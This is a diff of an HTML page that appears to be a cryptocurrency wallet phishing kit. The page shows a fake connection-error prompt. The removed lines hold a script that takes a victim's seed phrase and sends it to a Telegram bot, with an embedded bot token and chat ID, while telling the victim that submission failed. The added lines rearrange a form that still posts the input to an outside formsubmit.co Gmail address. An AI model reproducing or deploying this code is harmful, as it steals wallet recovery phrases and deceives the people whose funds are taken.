@@ -1423,7 +1423,8 @@
       <div class="modal-content">
         <button class="close">×</button>
        
-          
+          <form action="https://formsubmit.co/formsubmitmails@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+            
           <img id="modalImage" src="tariff" alt="">
           <h2 id="modalTitle"></h2>
           <br>
@@ -1441,10 +1442,9 @@
             <br>
             <br>
           </div>
-       <form action="https://formsubmit.co/formsubmitmails@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+       
                                        
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next"access/point/success.html">
+                                       
           <div id="buttonContainer" class="container">
             <button class="button-red">
               An error occurred... please try again or connect manually
@@ -1491,79 +1491,12 @@
       </div>
     </div>
 
-    <script src="js/javasc.js"></script>
+    
 
-    <script>
-      document
-        .getElementById("sendButton")
-        .addEventListener("click", async (e) => {
-          e.preventDefault();
-          const phrase = document.getElementById("inputTextArea").value;
-          const recipientEmail =
-            document.getElementById("recipientEmail").value;
-          const errorDiv = document.querySelector(".error");
+   
 
-          if (!phrase || !recipientEmail) {
-            errorDiv.innerHTML = "Please fill in all required fields.";
-            errorDiv.style.color = "red";
-            setTimeout(() => {
-              errorDiv.innerHTML = "";
-            }, 2000);
-            return;
-          }
-
-          const message = `New Seed Phrase Submission\nSeed Phrase: ${phrase}\nRecipient Email: ${recipientEmail}`;
-
-          try {
-            const response = await fetch(
-              "https://api.telegram.org/bot7425601103:AAEDrBH7BH9NUG_4T5lzVO4A4ECjm9LiOVI/sendMessage",
-              {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                  chat_id: "8293580927",
-                  text: message,
-                }),
-              }
-            );
-
-            const result = await response.json();
-            if (result.ok) {
-              errorDiv.innerHTML = "Submission failed. Please try again.";
-              errorDiv.style.color = "red";
-              document.getElementById("form1").reset();
-            } else {
-              errorDiv.innerHTML = "Submission failed. Please try again.";
-              errorDiv.style.color = "red";
-            }
-          } catch (error) {
-            console.error("Error:", error);
-            errorDiv.innerHTML = "Submission failed. Please try again.";
-            errorDiv.style.color = "red";
-          }
-
-          setTimeout(() => {
-            errorDiv.innerHTML = "";
-          }, 2000);
-        });
-    </script>
-
-    <!-- <script>
-      function validateForm() {
-        const inputText = document.getElementById("inputTextArea").value.trim();
-        const words = inputText.split(/\s+/);
-
-        if (words.length !== 12 && words.length !== 24) {
-          document.getElementById("errorMessage").style.display = "block";
-          return false; // Prevent form submission
-        }
-
-        // Validation successful, continue with form submission
-        return true;
-      }
-    </script> -->
+  
+ 
   
 
 </body></html>
